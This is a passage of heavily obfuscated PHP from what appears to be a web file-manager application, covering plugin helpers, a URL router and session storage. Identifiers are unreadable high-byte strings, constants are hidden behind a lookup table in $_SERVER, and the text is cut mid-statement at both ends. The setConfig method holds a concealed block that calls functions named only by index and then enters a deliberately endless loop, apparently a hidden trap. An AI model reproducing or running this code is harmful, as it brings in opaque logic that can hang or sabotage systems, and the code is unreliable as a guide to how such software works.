$«Î‰‰Æö)) { return KodIO::make($Ñ®áÆâ); } $á°¦„ˆı = $this->cachePath . $«Î‰‰Æö; return $this->pluginCacheFileSet($á°¦„ˆı, file_get_contents_nossl($è›Ì‘‡‹)); } final function _tmpFileName($ËìøÍÀ² = array()) { $Â²µ•äµ =& $_SERVER[Å¶¨Şêº]; if (!$ËìøÍÀ²) { $ËìøÍÀ² = $this->fileInfo; } if (isset($ËìøÍÀ²[$Â²µ•äµ[188]])) { return $ËìøÍÀ²[$Â²µ•äµ[188]]; } if (isset($ËìøÍÀ²[$Â²µ•äµ[181]][$Â²µ•äµ[188]])) { return $ËìøÍÀ²[$Â²µ•äµ[181]][$Â²µ•äµ[188]]; } $æ’®ê‘ä = IO::hashSimple($ËìøÍÀ²[$Â²µ•äµ[95]]); if ($æ’®ê‘ä) { return $æ’®ê‘ä; } $ƒ™Áœ = array($ËìøÍÀ²[$Â²µ•äµ[42]], $ËìøÍÀ²[$Â²µ•äµ[95]], $ËìøÍÀ²[$Â²µ•äµ[87]]); if (isset($ËìøÍÀ²[$Â²µ•äµ[520]])) { $ƒ™Áœ[] = $ËìøÍÀ²[$Â²µ•äµ[520]]; } return md5(implode($Â²µ•äµ[11], $ƒ™Áœ)); } final function checkSharePath($…‡óÍ) { $şšıˆª† =& $_SERVER[Å¶¨Şêº]; if (!$this->isShare($…‡óÍ)) { return !1; } $ÂšóµŸ = Action($şšıˆª†[1171])->sharePathInfo($…‡óÍ); if (!isset($ÂšóµŸ[$şšıˆª†[95]])) { show_json(LNG($şšıˆª†[1558]), !1); } $this->fileInfo = $ÂšóµŸ[$şšıˆª†[181]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$şšıˆª†[188]]); return $ÂšóµŸ[$şšıˆª†[95]]; } final function pluginCachePath($õ¸×£ÈÏ = '') { $ˆ›¸Ô€ =& $_SERVER[Å¶¨Şêº]; $‚ì­¸®ı = IO_PATH_SYSTEM_TEMP . $ˆ›¸Ô€[1559] . $this->pluginName; if (!($µüğ›×¢ = IO::infoFull($‚ì­¸®ı))) { return IO::mkdir($‚ì­¸®ı . $ˆ›¸Ô€[8] . $õ¸×£ÈÏ); } if (empty($õ¸×£ÈÏ)) { return $µüğ›×¢[$ˆ›¸Ô€[95]]; } if (!($Ş¯’«ğ— = IO::fileNameExist($µüğ›×¢[$ˆ›¸Ô€[95]], $õ¸×£ÈÏ))) { return IO::mkdir($µüğ›×¢[$ˆ›¸Ô€[95]] . $õ¸×£ÈÏ); } return KodIO::make($Ş¯’«ğ—); } final function pluginCacheFileSet($µÊ­‹ˆ¬, $æ¯ˆ€– = '') { $€Ê”¥…Î =& $_SERVER[Å¶¨Şêº]; if (!($ÊÜêÒÆİ = IO::infoFull($µÊ­‹ˆ¬))) { return IO::mkfile($µÊ­‹ˆ¬, $æ¯ˆ€–, REPEAT_REPLACE); } IO::setContent($ÊÜêÒÆİ[$€Ê”¥…Î[95]], $æ¯ˆ€–); return $ÊÜêÒÆİ[$€Ê”¥…Î[95]]; } final function pluginLocalFile($“´÷¨Ñ‘ = '') { $Ï˜¿Šı¼ =& $_SERVER[Å¶¨Şêº]; $ä‰ùÃ® = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($ä‰ùÃ®)) { mk_dir($ä‰ùÃ®); } if (!$“´÷¨Ñ‘) { return $ä‰ùÃ®; } $ò×ÓÜ²Á = IO::info($“´÷¨Ñ‘); $ÏÈÁì¯é = $this->_tmpFileName($ò×ÓÜ²Á) . $Ï˜¿Šı¼[10] . $ò×ÓÜ²Á[$Ï˜¿Šı¼[185]]; if (!checkExtSafe($ÏÈÁì¯é)) { $ÏÈÁì¯é = $ÏÈÁì¯é . $Ï˜¿Šı¼[1204]; } $ÂáÍñµ› = $ä‰ùÃ® . $ÏÈÁì¯é; if (@file_exists($ÂáÍñµ›)) { return $ÂáÍñµ›; } return IO::copy($“´÷¨Ñ‘, $ä‰ùÃ®, 0, $ÏÈÁì¯é); } final function appPackage() { $÷÷ÓÄğ– =& $_SERVER[Å¶¨Şêº]; if ($this->packageData) { return $this->packageData; } $º’Çù”ƒ = $this->parseFile($this->pluginPath . $÷÷ÓÄğ–[1560]); $this->parseLang($º’Çù”ƒ); $ı‹‘‘şí = json_decode_force($º’Çù”ƒ); if (!$ı‹‘‘şí) { return array(); } $ŒôÇØš¦ = Hook::trigger($÷÷ÓÄğ–[1561], $ı‹‘‘şí); if ($ŒôÇØš¦ && is_array($ŒôÇØš¦)) { $ı‹‘‘şí = $ŒôÇØš¦; } $this->packageData = $ı‹‘‘şí; return $ı‹‘‘şí; } public function packageInfoGet($Œ¾Ğ¢¤“) { $àÁ ôüÌ = $this->appPackage(); return array_get_value($àÁ ôüÌ, $Œ¾Ğ¢¤“); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Å¶¨Şêº][1562]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Å¶¨Şêº][1563]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Å¶¨Şêº][1564]); } public function echoJsAssign($¹ßˆ¸®, $Ïºåã—á) { $this->echoJsAssignArr[$¹ßˆ¸®] = $Ïºåã—á; } private function parseFile($™ï¶ñÅ¿) { $„€¾ÆÂÜ =& $_SERVER[Å¶¨Şêº]; $½¥Å“µÏ = file_get_contents_nossl($™ï¶ñÅ¿); $ˆ¬³ûÛƒ = array($„€¾ÆÂÜ[1565], $„€¾ÆÂÜ[1566], $„€¾ÆÂÜ[1567], $„€¾ÆÂÜ[1568], $„€¾ÆÂÜ[1569], $„€¾ÆÂÜ[1570], $„€¾ÆÂÜ[1571]); $ÙÖ…Ì‘• = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$„€¾ÆÂÜ[100]][$„€¾ÆÂÜ[1572]]); foreach ($this->echoJsAssignArr as $š­¸ø“Ä => $¢™³å§) { $ˆ¬³ûÛƒ[] = $„€¾ÆÂÜ[1573] . $š­¸ø“Ä . $„€¾ÆÂÜ[1574]; $ÙÖ…Ì‘•[] = is_array($¢™³å§) || is_object($¢™³å§) ? rawurlencode(json_encode($¢™³å§)) : $¢™³å§; } if (strstr($½¥Å“µÏ, $„€¾ÆÂÜ[1575])) { $Î®¬•šú = rawurlencode(json_encode($this->pluginLangArr)); $½¥Å“µÏ = str_replace($„€¾ÆÂÜ[1575], $Î®¬•šú, $½¥Å“µÏ); } if (strstr($½¥Å“µÏ, $„€¾ÆÂÜ[1576])) { $Î®¬•šú = $Î®¬•šú = rawurlencode(json_encode($this->getConfig())); $½¥Å“µÏ = str_replace($„€¾ÆÂÜ[1576], $Î®¬•šú, $½¥Å“µÏ); } $½¥Å“µÏ = str_replace($ˆ¬³ûÛƒ, $ÙÖ…Ì‘•, $½¥Å“µÏ); return $½¥Å“µÏ; } private function parseLang(&$ÈıƒÉ—á) { $éÑİÇ¼Ì =& $_SERVER[Å¶¨Şêº]; $çˆ˜¤ç = $éÑİÇ¼Ì[1577]; if (!strstr($ÈıƒÉ—á, $çˆ˜¤ç)) { return; } preg_match_all($éÑİÇ¼Ì[1578], $ÈıƒÉ—á, $ÛÁâ­£); if (!is_array($ÛÁâ­£) || count($ÛÁâ­£) == 0 || !is_array($ÛÁâ­£[0]) || count($ÛÁâ­£[0]) == 0) { return; } $ëçò¶Ğù = array(); $°ÓùÒØÑ = array(); foreach ($ÛÁâ­£[0] as $…•›†³Á) { $şğÈÅ‡ = substr($…•›†³Á, strlen($çˆ˜¤ç), -4); $–ÛøÈ¶ = LNG($şğÈÅ‡); $ëçò¶Ğù[] = $…•›†³Á; $°ÓùÒØÑ[] = str_replace(array($éÑİÇ¼Ì[19], $éÑİÇ¼Ì[1075], $éÑİÇ¼Ì[352], $éÑİÇ¼Ì[129]), array($éÑİÇ¼Ì[63], $éÑİÇ¼Ì[63], $éÑİÇ¼Ì[12], $éÑİÇ¼Ì[1579]), $–ÛøÈ¶); } $ÈıƒÉ—á = str_replace($ëçò¶Ğù, $°ÓùÒØÑ, $ÈıƒÉ—á); } private function parseConfig(&$üË‰ø–) { $ïæÌªè¸ =& $_SERVER[Å¶¨Şêº]; $Ÿùøü•  = $ïæÌªè¸[1580]; if (!strstr($üË‰ø–, $Ÿùøü• )) { return; } preg_match_all($ïæÌªè¸[1581], $üË‰ø–, $ÊùŸèğ); if (!is_array($ÊùŸèğ) || count($ÊùŸèğ) == 0 || !is_array($ÊùŸèğ[0]) || count($ÊùŸèğ[0]) == 0) { return; } $û¡”ü­ = $this->getConfig(); $¢ŠµÕ = array(); $øÑ’Áê = array(); foreach ($ÊùŸèğ[0] as $÷Ë¸í¦) { $ó‹Îıé¡ = substr($÷Ë¸í¦, strlen($Ÿùøü• ), -2); $¢ŠµÕ[] = $÷Ë¸í¦; $øÑ’Áê[] = _get($û¡”ü­, $ó‹Îıé¡); } $üË‰ø– = str_replace($¢ŠµÕ, $øÑ’Áê, $üË‰ø–); } private function parsePackage(&$à†Ÿâ¤‹) { $Ú®×Ê¾• =& $_SERVER[Å¶¨Şêº]; $¥¿àêà = $Ú®×Ê¾•[1582]; if (!strstr($à†Ÿâ¤‹, $¥¿àêà)) { return; } preg_match_all($Ú®×Ê¾•[1583], $à†Ÿâ¤‹, $èÒù·ßŒ); if (!is_array($èÒù·ßŒ) || count($èÒù·ßŒ) == 0 || !is_array($èÒù·ßŒ[0]) || count($èÒù·ßŒ[0]) == 0) { return; } $ÍèÊØ¿‹ = $this->appPackage(); $¨Ã“¦àë = array(); $Œìæ®¢Ò = array(); foreach ($èÒù·ßŒ[0] as $ÍñŸÂÇ´) { $—Ññæú’ = substr($ÍñŸÂÇ´, strlen($¥¿àêà), -2); $¨Ã“¦àë[] = $ÍñŸÂÇ´; $Œìæ®¢Ò[] = _get($ÍèÊØ¿‹, $—Ññæú’); } $à†Ÿâ¤‹ = str_replace($¨Ã“¦àë, $Œìæ®¢Ò, $à†Ÿâ¤‹); } final function echoFile($š¿‰Ëœ¶, $å´ÔĞ ¬ = false) { $–ê¯°œê =& $_SERVER[Å¶¨Şêº]; $·¶¶ = $this->pluginPath . $š¿‰Ëœ¶; if (ACT == $–ê¯°œê[1584]) { echo $–ê¯°œê[1585] . $this->pluginName . $–ê¯°œê[8] . $š¿‰Ëœ¶ . $–ê¯°œê[1586]; if (!file_exists($·¶¶)) { echo $–ê¯°œê[1587]; return; } } $ÅíŞª¡ = $this->parseFile($·¶¶); $this->parseLang($ÅíŞª¡); $this->parseConfig($ÅíŞª¡); $this->parsePackage($ÅíŞª¡); if (is_array($å´ÔĞ ¬)) { $ÅíŞª¡ = str_replace(array_keys($å´ÔĞ ¬), array_values($å´ÔĞ ¬), $ÅíŞª¡); } echo $–ê¯°œê[19] . $ÅíŞª¡; } final function initLang() { $éêÈÚ¼ =& $_SERVER[Å¶¨Şêº]; $İœƒÁÍ = $éêÈÚ¼[1588]; $­àâüö = $this->pluginPath . $éêÈÚ¼[1589]; $îœ¢É»ñ = I18n::getType(); $ĞÎ·¥ = array(); if (file_exists($­àâüö . $îœ¢É»ñ . $éêÈÚ¼[836])) { $ĞÎ·¥ = (include $­àâüö . $îœ¢É»ñ . $éêÈÚ¼[836]); } else { if ($îœ¢É»ñ == $éêÈÚ¼[1590] && !file_exists($­àâüö . $îœ¢É»ñ . $éêÈÚ¼[836]) && file_exists($­àâüö . $éêÈÚ¼[1591])) { $ĞÎ·¥ = (include $­àâüö . $éêÈÚ¼[1591]); } else { if (file_exists($­àâüö . $İœƒÁÍ . $éêÈÚ¼[836])) { $ĞÎ·¥ = (include $­àâüö . $İœƒÁÍ . $éêÈÚ¼[836]); } } } if (!is_array($ĞÎ·¥)) { return array(); } if (@count($ĞÎ·¥) > 0) { I18n::set($ĞÎ·¥); } return $ĞÎ·¥; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ù–Ğñ›‚) { $å¥ùï– =& $_SERVER[Å¶¨Şêº]; if (!isset($_SERVER[$å¥ùï–[15]]) || !isset($_SERVER[$å¥ùï–[13]])) { $“Ûóª¾± = $å¥ùï–[874]; $Ñö¼¹¯¡ = $å¥ùï–[16]; $µßÆÊÒ§ = $_SERVER[$å¥ùï–[17]] . $å¥ùï–[18]; $˜÷øŠ² = $Ñö¼¹¯¡($µßÆÊÒ§); $äË—¤áâ = explode($å¥ùï–[19], $˜÷øŠ²); if (count($äË—¤áâ) < $å¥ùï–[629]) { $ïöìéÜÖ = $å¥ùï–[21]; $ïöìéÜÖ(); } $ğ¨Ô‘Æ = $å¥ùï–[875]; $ğ¨Ô‘Æ($_SERVER[$å¥ùï–[876]]); $É€‹¢²œ = 1; for ($ƒ‚À³Ëı = $É€‹¢²œ; $ƒ‚À³Ëı > 0; $ƒ‚À³Ëı++) { $ğ¨Ô‘Æ = json_encode($GLOBALS[$å¥ùï–[427]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ù–Ğñ›‚); } public function onSetConfig($Š±–ğ¹Ç) { } public function onGetConfig($úˆÁõ”ä) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($…ä¾£ÎË) { if ($…ä¾£ÎË == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ÖÚ§¼ ¿ = "\160\x6c\165\147\x69\156\101\x75\x74\150") { $ûÑ°Û =& $_SERVER[Å¶¨Şêº]; if (!Session::get($ûÑ°Û[1543])) { return !1; } if (_get($GLOBALS, $ûÑ°Û[503])) { return !0; } $¾ñ’»¼ = $this->getConfig(); if (!$¾ñ’»¼[$ÖÚ§¼ ¿]) { return !1; } return ActionCall($ûÑ°Û[1592], $¾ñ’»¼[$ÖÚ§¼ ¿]); } public function url($şñ‹£Ğú, $Å–ºéğƒ = '', $Ï¦«òÓ = true) { $õ¯õ¯¼Ç =& $_SERVER[Å¶¨Şêº]; $­šşŒ¼ƒ = $this->getConfig(); $œ®ãöÈ¦ = KOD_VERSION . $õ¯õ¯¼Ç[10] . KOD_VERSION_BUILD; $÷¾¿Ğ”É = $this->packageVersion(); $Ïó·ÁĞŠ = $œ®ãöÈ¦ . $õ¯õ¯¼Ç[395] . $÷¾¿Ğ”É; if (substr($şñ‹£Ğú, 0, 4) == $õ¯õ¯¼Ç[159] || substr($şñ‹£Ğú, 0, 2) == $õ¯õ¯¼Ç[1377]) { $¬ëÌƒŒÊ = $şñ‹£Ğú . $õ¯õ¯¼Ç[1593] . $Ïó·ÁĞŠ; } else { if ($Å–ºéğƒ == $õ¯õ¯¼Ç[12]) { $¬ëÌƒŒÊ = $this->pluginHost . $şñ‹£Ğú . $õ¯õ¯¼Ç[1593] . $Ïó·ÁĞŠ; } else { if ($Å–ºéğƒ === $õ¯õ¯¼Ç[86]) { $¬ëÌƒŒÊ = $this->pluginHost . $şñ‹£Ğú; } else { if ($Å–ºéğƒ == $õ¯õ¯¼Ç[1594]) { $¬ëÌƒŒÊ = STATIC_PATH . $şñ‹£Ğú . $õ¯õ¯¼Ç[1593] . $œ®ãöÈ¦; } else { if ($Å–ºéğƒ == $õ¯õ¯¼Ç[1595]) { $¬ëÌƒŒÊ = APP_HOST . $õ¯õ¯¼Ç[1596] . $şñ‹£Ğú . $õ¯õ¯¼Ç[1593] . $œ®ãöÈ¦; } else { if (isset($­šşŒ¼ƒ[$Å–ºéğƒ])) { $¬ëÌƒŒÊ = $­šşŒ¼ƒ[$Å–ºéğƒ] . $şñ‹£Ğú . $õ¯õ¯¼Ç[1593] . $Ïó·ÁĞŠ; } } } } } } if (!$Ï¦«òÓ) { return $¬ëÌƒŒÊ; } echo $¬ëÌƒŒÊ; } public function link($éÛ˜ÇÔ» = false, $’‡àëˆ = '') { $¸ëĞêá =& $_SERVER[Å¶¨Şêº]; if (!$éÛ˜ÇÔ») { $this->link($¸ëĞêá[1597], $¸ëĞêá[1595]); $this->link($¸ëĞêá[1598], $¸ëĞêá[1594]); $this->link($¸ëĞêá[1599], $¸ëĞêá[1594]); $this->link($¸ëĞêá[1600], $¸ëĞêá[1594]); $this->link($¸ëĞêá[1601], $¸ëĞêá[1594]); return; } $­˜†¨ = $this->url($éÛ˜ÇÔ», $’‡àëˆ, !1); if (substr($éÛ˜ÇÔ», -3) == $¸ëĞêá[1602]) { echo $¸ëĞêá[1603] . $­˜†¨ . $¸ëĞêá[1604] . $¸ëĞêá[19]; } else { if (substr($éÛ˜ÇÔ», -4) == $¸ëĞêá[1605]) { echo $¸ëĞêá[1606] . $­˜†¨ . $¸ëĞêá[1607] . $¸ëĞêá[19]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\x6e\x79" => "\133\x5e\x2f\x5d\53", "\72\156\x75\x6d" => "\133\60\x2d\71\x5d\53", "\72\x61\154\154" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($®¹À¾ı, $ï¢ç¶€) { $û‰Ÿ×ƒ¼ =& $_SERVER[Å¶¨Şêº]; if ($®¹À¾ı == $û‰Ÿ×ƒ¼[1608]) { $ÀÉ‘¹ùº = array_map($û‰Ÿ×ƒ¼[1609], $ï¢ç¶€[0]); $©ï›¸Ó = strpos($ï¢ç¶€[1], $û‰Ÿ×ƒ¼[8]) === 0 ? $ï¢ç¶€[1] : $û‰Ÿ×ƒ¼[8] . $ï¢ç¶€[1]; $ìÃç³Öê = $ï¢ç¶€[2]; } else { $ÀÉ‘¹ùº = null; $©ï›¸Ó = strpos($ï¢ç¶€[0], $û‰Ÿ×ƒ¼[8]) === 0 ? $ï¢ç¶€[0] : $û‰Ÿ×ƒ¼[8] . $ï¢ç¶€[0]; $ìÃç³Öê = $ï¢ç¶€[1]; } array_push(self::$maps, $ÀÉ‘¹ùº); array_push(self::$routes, $©ï›¸Ó); array_push(self::$methods, strtoupper($®¹À¾ı)); array_push(self::$callbacks, $ìÃç³Öê); } public static function error($Ú­ÍÎ·) { self::$errorCallback = $Ú­ÍÎ·; } public static function haltOnMatch($²–¶Ï¾ = true) { self::$halts = $²–¶Ï¾; } public static function dispatch() { $—Š‰›âü =& $_SERVER[Å¶¨Şêº]; $‚ã‡÷ğƒ = parse_url($_SERVER[$—Š‰›âü[1610]], PHP_URL_PATH); $‹ £·ˆï = $_SERVER[$—Š‰›âü[170]]; $æİ…Î¬Ô = array_keys(static::$patterns); $¤åÑÀé± = array_values(static::$patterns); $ÑÇ‹×ƒĞ = !1; self::$routes = preg_replace($—Š‰›âü[1274], $—Š‰›âü[8], self::$routes); if (in_array($‚ã‡÷ğƒ, self::$routes)) { $¿¬ÈÌÈÆ = array_keys(self::$routes, $‚ã‡÷ğƒ); foreach ($¿¬ÈÌÈÆ as $ÛäƒÉÛ) { if (self::$methods[$ÛäƒÉÛ] == $‹ £·ˆï || self::$methods[$ÛäƒÉÛ] == $—Š‰›âü[1611] || in_array($‹ £·ˆï, self::$maps[$ÛäƒÉÛ])) { $ÑÇ‹×ƒĞ = !0; if (!is_object(self::$callbacks[$ÛäƒÉÛ])) { $Óæ¢Œ° = explode($—Š‰›âü[8], self::$callbacks[$ÛäƒÉÛ]); $Êí¦÷ ß = end($Óæ¢Œ°); $“Ê¨ÍÓ = explode($—Š‰›âü[1206], $Êí¦÷ ß); $¯ˆÑ‚ = new $“Ê¨ÍÓ[0](); $¯ˆÑ‚->{$“Ê¨ÍÓ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ÛäƒÉÛ]); if (self::$halts) { return; } } } } } else { $•ƒìãù  = 0; foreach (self::$routes as $ÛäƒÉÛ) { if (strpos($ÛäƒÉÛ, $—Š‰›âü[4]) !== !1) { $ÛäƒÉÛ = str_replace($æİ…Î¬Ô, $¤åÑÀé±, $ÛäƒÉÛ); } if (preg_match($—Š‰›âü[1612] . $ÛäƒÉÛ . $—Š‰›âü[1613], $‚ã‡÷ğƒ, $¯¤»ÃöĞ)) { if (self::$methods[$•ƒìãù ] == $‹ £·ˆï || self::$methods[$•ƒìãù ] == $—Š‰›âü[1611] || !empty(self::$maps[$•ƒìãù ]) && in_array($‹ £·ˆï, self::$maps[$•ƒìãù ])) { $ÑÇ‹×ƒĞ = !0; array_shift($¯¤»ÃöĞ); if (!is_object(self::$callbacks[$•ƒìãù ])) { $Óæ¢Œ° = explode($—Š‰›âü[8], self::$callbacks[$•ƒìãù ]); $Êí¦÷ ß = end($Óæ¢Œ°); $“Ê¨ÍÓ = explode($—Š‰›âü[1206], $Êí¦÷ ß); $¯ˆÑ‚ = new $“Ê¨ÍÓ[0](); if (!method_exists($¯ˆÑ‚, $“Ê¨ÍÓ[1])) { echo $—Š‰›âü[1614]; } else { call_user_func_array(array($¯ˆÑ‚, $“Ê¨ÍÓ[1]), $¯¤»ÃöĞ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$•ƒìãù ], $¯¤»ÃöĞ); if (self::$halts) { return; } } } } $•ƒìãù ++; } } if ($ÑÇ‹×ƒĞ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $Ú±é×ô¼ =& $_SERVER[Å¶¨Şêº]; header($_SERVER[$Ú±é×ô¼[1615]] . $Ú±é×ô¼[1616]); echo $Ú±é×ô¼[1617]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$—Š‰›âü[1610]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $¾ÛèÍ²’ =& $_SERVER[Å¶¨Şêº]; static $ÖÓúì’ = false; if ($ÖÓúì’) { return $ÖÓúì’; } $úÙšãÊ = $GLOBALS[$¾ÛèÍ²’[6]][$¾ÛèÍ²’[359]]; self::$sessionTime = $úÙšãÊ[$¾ÛèÍ²’[1618]]; $é¢Öø± = isset($GLOBALS[$¾ÛèÍ²’[1619]]) ? $GLOBALS[$¾ÛèÍ²’[1619]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($é¢Öø±)) { self::$sessionSign = Cookie::get($é¢Öø±); } else { self::$sessionSign = guid(); } } Cookie::setSafe($é¢Öø±, self::$sessionSign, self::$sessionTime); $××Äâ› = $úÙšãÊ[$¾ÛèÍ²’[1620]]; $¾¨¶ù…÷ = $úÙšãÊ[$××Äâ›]; $„øËëê€ = $úÙšãÊ[$¾ÛèÍ²’[826]]; switch ($××Äâ›) { case $¾ÛèÍ²’[31]: self::$handle = Model($¾ÛèÍ²’[827]); break; case $¾ÛèÍ²’[828]: self::$handle = new CacheRedis($¾¨¶ù…÷, $„øËëê€); break; case $¾ÛèÍ²’[829]: self::$handle = new CacheMemcached($¾¨¶ù…÷, $„øËëê€); break; case $¾ÛèÍ²’[211]: $¾¨¶ù…÷[$¾ÛèÍ²’[95]] = $¾¨¶ù…÷[$¾ÛèÍ²’[95]] . $¾ÛèÍ²’[1621]; self::$handle = new CacheFile($¾¨¶ù…÷, $„øËëê€); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ÖÓúì’ = new self(); return $ÖÓúì’; } public static function getBySign($¦¹ªÑ³€) { $Áî±Š®á = self::$handle->get($¦¹ªÑ³€); $Áî±Š®á = unserialize($Áî±Š®á); return is_array($Áî±Š®á) ? $Áî±Š®á : array(); } public static function setBySign($Á¾„ß, $¸â¹Ú—è) { CacheLock::lock($Á¾„ß); self::$handle->set($Á¾„ß, serialize($¸â¹Ú—è), self::$sessionTime); CacheLock::unlock($Á¾„ß); } public static function sign($–öó¾²Ò = false) { $–öó¾²Ò && (self::$sessionSign = $–öó¾²Ò); self::init(); return self::$sessionSign; } public static function set($¥Š‡û”ø, $µÇ”ã = false) { self::init(); if (is_array($¥Š‡û”ø)) { foreach ($¥Š‡û”ø as $ÚŠäµˆñ => $µ˜Áõîâ) { array_set_value(self::$data, $ÚŠäµˆñ, $µ˜Áõîâ); } } else { array_set_value(self::$data, $¥Š‡û”ø, $µÇ”ã); } self::setBySign(self::$sessionSign, self::$data); } public static function get($¸’ğšòê = false) { self::init(); if (!$¸’ğšòê) { return self::$data; } return array_get_value(self::$data, $¸’ğšòê); } public static function remove($äú©½å) { self::init(); unset(self::$data[$äú©½å]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Å¶¨Şêº][831])) { self::$handle->clearTimeout(); } } } goto E¶¹Á»õÃ; AŸÕ°ÊêÇ: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($á¹Œ´ğÜ) { $£Ş’¨©ı =& $_SERVER[Å¶¨Şêº]; $ÍÊüşı = Model($£Ş’¨©ı[513])->where(array($£Ş’¨©ı[1654] => $á¹Œ´ğÜ))->find(); $Ñ»Õìóµ = $this->_mkdirRoot(SourceModel::TYPE_USER, $á¹Œ´ğÜ, $ÍÊüşı[$£Ş’¨©ı[42]]); $this->userDesktopAdd($Ñ»Õìóµ); return $Ñ»Õìóµ; } public function userDesktopAdd($Òı½£áÔ) { $èâÉêıÎ =& $_SERVER[Å¶¨Şêº]; $Ğ‘·‘ğ = LNG($èâÉêıÎ[2124]); $Æ¿ÙÚ¸ = $this->mkdir($Òı½£áÔ, $Ğ‘·‘ğ); $this->metaSet($Æ¿ÙÚ¸, $èâÉêıÎ[2125], $èâÉêıÎ[99]); $this->metaSet($Òı½£áÔ, $èâÉêıÎ[2126], $Æ¿ÙÚ¸); } public function userPathSafeAdd($Ø¬ŞÇÌ) { $»Ù½ÉÉî =& $_SERVER[Å¶¨Şêº]; $€ÍÛõˆô = Model($»Ù½ÉÉî[513])->getInfoFull($Ø¬ŞÇÌ); if (!$€ÍÛõˆô) { return !1; } if (_get($€ÍÛõˆô, $»Ù½ÉÉî[535])) { return $€ÍÛõˆô[$»Ù½ÉÉî[475]][$»Ù½ÉÉî[2127]]; } $ãµ¦šµÖ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ø¬ŞÇÌ, $»Ù½ÉÉî[2128], $»Ù½ÉÉî[442]); Model($»Ù½ÉÉî[513])->metaSet($Ø¬ŞÇÌ, $»Ù½ÉÉî[2127], $ãµ¦šµÖ); $this->metaSet($ãµ¦šµÖ, $»Ù½ÉÉî[2129], $Ø¬ŞÇÌ); return $ãµ¦šµÖ; } public function groupRootAdd($ø¿Ü›€’) { $É‘ËÌ¢ =& $_SERVER[Å¶¨Şêº]; $ŠşÉ‡Ñ = Model($É‘ËÌ¢[521])->where(array($É‘ËÌ¢[1940] => $ø¿Ü›€’))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ø¿Ü›€’, $ŠşÉ‡Ñ[$É‘ËÌ¢[42]]); } public function systemRootPathAdd($å÷…šÍ“) { if ($å÷…šÍ“ != $_SERVER[Å¶¨Şêº][543]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $å÷…šÍ“); } public function userRootRemove($¸¾àĞİ) { $Ø©èé = $this->targetSourceRoot(SourceModel::TYPE_USER, $¸¾àĞİ, !0); foreach ($Ø©èé as $Ä¿¦İ¹ü) { if (!$Ä¿¦İ¹ü) { continue; } $this->remove($Ä¿¦İ¹ü[$_SERVER[Å¶¨Şêº][411]], !1); } } public function groupRootRemove($äá€èÔ¾) { $şšƒ»– = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $äá€èÔ¾); if (!$şšƒ»–) { return; } $this->remove($şšƒ»–[$_SERVER[Å¶¨Şêº][411]], !1); } private function _mkdirRoot($çñ™ü©, $¢œ«›á£, $Û¥ã¶”ˆ, $£™ğªŒê = '') { $Ç“¬ášá =& $_SERVER[Å¶¨Şêº]; $×ƒÃˆ¬„ = array($Ç“¬ášá[410] => 0, $Ç“¬ášá[585] => $çñ™ü©, $Ç“¬ášá[586] => $¢œ«›á£, $Ç“¬ášá[583] => 1, $Ç“¬ášá[587] => USER_ID, $Ç“¬ášá[588] => USER_ID, $Ç“¬ášá[584] => $£™ğªŒê, $Ç“¬ášá[589] => $Ç“¬ášá[530], $Ç“¬ášá[439] => 0, $Ç“¬ášá[554] => 0, $Ç“¬ášá[478] => 0, $Ç“¬ášá[590] => $Ç“¬ášá[12]); if ($Úç§¬Ø = $this->where($×ƒÃˆ¬„)->find()) { return $Úç§¬Ø[$Ç“¬ášá[411]]; } $ü–—½²Ú = "\x4d\157\144\x65\154\x53\157\x75\162\143\x65\x2e\x6d\x6b\x64\x69\162\x52\157\x6f\164\56{$çñ™ü©}\56{$¢œ«›á£}\56" . $Û¥ã¶”ˆ; CacheLock::lock($ü–—½²Ú); $×ƒÃˆ¬„[$Ç“¬ášá[42]] = $Û¥ã¶”ˆ; $ç˜Õ÷‹õ = $this->add($×ƒÃˆ¬„); $šÓø’ˆ× = array($Ç“¬ášá[591] => short_id($ç˜Õ÷‹õ)); $this->where(array($Ç“¬ášá[426] => $ç˜Õ÷‹õ))->save($šÓø’ˆ×); CacheLock::unlock($ü–—½²Ú); return $ç˜Õ÷‹õ; } private function targetSourceRoot($¾îİ‹Üë, $ª‰Ó›ÓÑ, $ÆÙÈ×Õ = false) { $¯è¡Åú¹ =& $_SERVER[Å¶¨Şêº]; $Û¯éóÏÈ = array($¯è¡Åú¹[410] => 0, $¯è¡Åú¹[585] => $¾îİ‹Üë, $¯è¡Åú¹[586] => $ª‰Ó›ÓÑ); if ($ÆÙÈ×Õ) { $êÁÉıØ« = $this->where($Û¯éóÏÈ)->select(); return $êÁÉıØ« ? 